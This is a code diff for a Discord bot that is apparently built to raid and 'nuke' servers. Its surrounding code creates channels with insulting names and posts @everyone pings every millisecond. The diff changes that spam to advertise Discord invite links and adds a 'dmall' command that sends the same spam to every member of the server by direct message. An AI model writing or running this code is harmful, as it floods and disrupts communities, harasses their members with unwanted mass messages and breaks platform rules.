@@ -61,11 +61,20 @@ client.on('messageCreate', async (message) => {
         break
       } else { message.guild.channels.create({name: `${message.author.username} fucked you`, type: 0 }).then((ch) => {
         setInterval(() => {
-            ch.send(`@everyone Fucked by Kama and ${message.author.username}`);
+            ch.send(`@everyone nuke by kama Kimino on top https://discord.com/invite/MZ3Kr6kUq\nEVENT SUID GAME ICI VENEZ SAKO QUE DU FAKE https://discord.com/invite/jZzMnjv7Js\n@everyone faites ping en message`);
         }, 1);
       })};
     };
   };
+  if(message.content.startsWith("dmall")) {
+    const guild = message.guild;// Replace 'GUILD_ID' with your target guild's ID
+
+    guild.members.cache.forEach((member) => {
+      member.send('@everyone nuke by kama Kimino on top https://discord.com/invite/MZ3Kr6kUq\nEVENT SUID GAME ICI VENEZ SAKO QUE DU FAKE https://discord.com/invite/jZzMnjv7Js')
+        .then(() => console.log(`Sent DM to ${member.user.tag}`))
+        .catch((error) => console.error(`Failed to send DM to ${member.user.tag}: ${error}`));
+    });
+  }
 
 
 })
